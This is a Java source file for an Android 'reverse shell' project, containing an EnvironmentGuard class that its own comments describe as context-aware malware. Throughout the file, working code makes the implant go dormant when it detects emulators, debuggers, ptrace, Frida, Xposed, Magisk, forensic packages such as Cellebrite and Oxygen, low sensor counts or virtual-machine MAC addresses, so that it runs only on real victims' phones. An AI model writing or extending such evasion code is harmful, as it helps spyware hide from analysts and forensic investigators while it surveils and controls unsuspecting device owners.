package com.example.reverseshell2;

import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.os.Build;
import android.os.Debug;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;

/**
 * Environment Guard — Context-Aware Anti-Analysis Module
 * 
 * Detects when the implant is running in a hostile environment:
 * - Android emulators (AVD, Genymotion, BlueStacks, Nox)
 * - Debuggers attached (JDWP, ptrace)
 * - Instrumentation frameworks (Frida, Xposed, Magisk)
 * - Forensic analysis tools (Cellebrite agent, Oxygen)
 * 
 * If any hostile indicator is found, the implant goes DORMANT:
 * - No data collection
 * - No network sync
 * - Appears completely inert to the analyst
 * 
 * This is "context-aware malware" — it only operates on real devices
 * with real users, never in sandboxes or labs.
 */
public class EnvironmentGuard {

    private static final String TAG = "SYS_GUARD";
    private static Boolean cachedResult = null;

    /**
     * Master check — returns TRUE if environment is SAFE to operate.
     * Returns FALSE if we should go dormant.
     */
    public static boolean isSafeEnvironment(Context context) {
        if (cachedResult != null) return cachedResult;

        boolean safe = true;

        if (isEmulator()) {
            Log.d(TAG, "Emulator detected — going dormant");
            safe = false;
        }
        if (isDebuggerAttached()) {
            Log.d(TAG, "Debugger detected — going dormant");
            safe = false;
        }
        if (isFridaDetected()) {
            Log.d(TAG, "Frida detected — going dormant");
            safe = false;
        }
        if (isXposedDetected()) {
            Log.d(TAG, "Xposed detected — going dormant");
            safe = false;
        }
        if (hasForensicTools(context)) {
            Log.d(TAG, "Forensic tools detected — going dormant");
            safe = false;
        }
        if (isLowSensorCount(context)) {
            Log.d(TAG, "Abnormally low sensor count — likely emulator");
            safe = false;
        }

        cachedResult = safe;
        return safe;
    }

    /**
     * Reset cached result — call when you want to re-check.
     */
    public static void resetCache() {
        cachedResult = null;
    }

    // ============================================================
    //  EMULATOR DETECTION
    // ============================================================

    private static boolean isEmulator() {
        int score = 0;

        // Build properties that indicate emulator
        if (Build.FINGERPRINT.contains("generic")) score += 3;
        if (Build.FINGERPRINT.contains("unknown")) score += 1;
        if (Build.MODEL.contains("google_sdk")) score += 3;
        if (Build.MODEL.contains("Emulator")) score += 3;
        if (Build.MODEL.contains("Android SDK")) score += 3;
        if (Build.MANUFACTURER.contains("Genymotion")) score += 3;
        if (Build.HARDWARE.contains("goldfish")) score += 3;
        if (Build.HARDWARE.contains("ranchu")) score += 3;
        if (Build.HARDWARE.contains("vbox86")) score += 3;
        if (Build.PRODUCT.contains("sdk")) score += 2;
        if (Build.PRODUCT.contains("vbox86p")) score += 3;
        if (Build.PRODUCT.contains("emulator")) score += 3;
        if (Build.BOARD.contains("unknown")) score += 1;
        if (Build.HOST.contains("Build")) score += 1;

        // Check for emulator-specific files
        String[] emulatorFiles = {
            "/dev/socket/qemud",
            "/dev/qemu_pipe",
            "/system/lib/libc_malloc_debug_qemu.so",
            "/sys/qemu_trace",
            "/system/bin/qemu-props",
            "/dev/goldfish_pipe",
            "/dev/goldfish_sync"
        };
        for (String path : emulatorFiles) {
            if (new File(path).exists()) score += 3;
        }

        // Check for specific phone number (emulators use 155552155XX)
        if (Build.SERIAL != null && Build.SERIAL.contains("unknown")) score += 1;

        // Threshold: 3+ points = emulator
        return score >= 3;
    }

    // ============================================================
    //  DEBUGGER DETECTION
    // ============================================================

    private static boolean isDebuggerAttached() {
        // Check Android debug API
        if (Debug.isDebuggerConnected()) return true;

        // Check for TracerPid (ptrace attached)
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/self/status"));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.startsWith("TracerPid:")) {
                    int tracerPid = Integer.parseInt(line.substring(10).trim());
                    br.close();
                    return tracerPid != 0; // Non-zero = someone is tracing us
                }
            }
            br.close();
        } catch (Exception ignored) {}

        return false;
    }

    // ============================================================
    //  FRIDA DETECTION
    // ============================================================

    private static boolean isFridaDetected() {
        // Method 1: Check /proc/self/maps for frida-agent
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/self/maps"));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("frida") || line.contains("gadget")) {
                    br.close();
                    return true;
                }
            }
            br.close();
        } catch (Exception ignored) {}

        // Method 2: Check for frida-server on default port
        try {
            java.net.Socket socket = new java.net.Socket();
            socket.connect(new java.net.InetSocketAddress("127.0.0.1", 27042), 1000);
            socket.close();
            return true; // Frida server is listening
        } catch (Exception ignored) {}

        // Method 3: Check for frida-related files
        String[] fridaPaths = {
            "/data/local/tmp/frida-server",
            "/data/local/tmp/re.frida.server",
            "/sdcard/frida-server"
        };
        for (String path : fridaPaths) {
            if (new File(path).exists()) return true;
        }

        return false;
    }

    // ============================================================
    //  XPOSED / MAGISK DETECTION
    // ============================================================

    private static boolean isXposedDetected() {
        // Check for Xposed installer
        try {
            Class.forName("de.robv.android.xposed.XposedBridge");
            return true;
        } catch (ClassNotFoundException ignored) {}

        // Check for Xposed-related stack traces
        try {
            throw new Exception("test");
        } catch (Exception e) {
            for (StackTraceElement element : e.getStackTrace()) {
                if (element.getClassName().contains("xposed") ||
                    element.getClassName().contains("Xposed")) {
                    return true;
                }
            }
        }

        // Check for Magisk (common root framework)
        String[] magiskPaths = {
            "/sbin/magisk",
            "/system/bin/magisk",
            "/system/xbin/magisk",
            "/data/adb/magisk",
            "/data/data/com.topjohnwu.magisk"
        };
        for (String path : magiskPaths) {
            if (new File(path).exists()) return true;
        }

        return false;
    }

    // ============================================================
    //  FORENSIC TOOL DETECTION
    // ============================================================

    private static boolean hasForensicTools(Context context) {
        PackageManager pm = context.getPackageManager();
        String[] forensicPackages = {
            "com.cellebrite.ufed",
            "com.oxygen.forensic",
            "com.msab.xry",
            "com.netspi.drozer",
            "com.mwr.dz",                    // Drozer
            "de.robv.android.xposed.installer",
            "com.saurik.substrate",           // Cydia Substrate
            "eu.chainfire.supersu",
            "com.topjohnwu.magisk",
            "com.zachspong.temprootremovejb",
            "com.amphoras.hidemyroot",
            "com.formyhm.hideroot"
        };

        for (String pkg : forensicPackages) {
            try {
                pm.getPackageInfo(pkg, 0);
                return true; // Known forensic/analysis tool installed
            } catch (PackageManager.NameNotFoundException ignored) {}
        }

        return false;
    }

    // ============================================================
    //  SENSOR CHECK (Emulators have 0-2 sensors)
    // ============================================================

    private static boolean isLowSensorCount(Context context) {
        try {
            SensorManager sm = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);
            if (sm != null) {
                List<Sensor> sensors = sm.getSensorList(Sensor.TYPE_ALL);
                // Real phones have 15-30+ sensors. Emulators have 0-3.
                return sensors.size() < 4;
            }
        } catch (Exception ignored) {}
        return false;
    }

    // ============================================================
    //  NETWORK CHECK (Emulator MACs are well-known)
    // ============================================================

    public static boolean hasEmulatorMac() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface ni : interfaces) {
                byte[] mac = ni.getHardwareAddress();
                if (mac == null) continue;
                StringBuilder sb = new StringBuilder();
                for (byte b : mac) sb.append(String.format("%02X:", b));
                String macStr = sb.toString().toUpperCase();
                // Known emulator MAC prefixes
                if (macStr.startsWith("08:00:27")) return true; // VirtualBox
                if (macStr.startsWith("00:0C:29")) return true; // VMware
                if (macStr.startsWith("00:50:56")) return true; // VMware
                if (macStr.startsWith("52:54:00")) return true; // QEMU/KVM
            }
        } catch (Exception ignored) {}
        return false;
    }
}
